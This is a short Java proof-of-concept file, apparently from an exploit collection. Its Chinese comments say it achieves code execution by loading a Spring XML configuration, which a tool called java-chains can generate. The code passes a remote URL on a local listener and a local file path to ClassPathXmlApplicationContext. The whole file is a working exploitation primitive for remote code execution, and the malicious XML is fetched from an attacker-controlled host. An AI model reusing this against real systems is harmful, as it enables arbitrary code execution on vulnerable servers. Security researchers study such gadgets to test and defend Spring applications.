package com.test.exp;

import org.springframework.context.support.ClassPathXmlApplicationContext;

// 利用加载Spring xml配置文件，实现代码执行
// 可以用java-chains生成xml
public class ClassPathXml {
    public static void main(String[] args) {
        String url = "http://127.0.0.1:7777/1.xml";
        ClassPathXmlApplicationContext http = new ClassPathXmlApplicationContext(url);
        url = "file:./1.xml";
        ClassPathXmlApplicationContext file = new ClassPathXmlApplicationContext(url);
    }
}
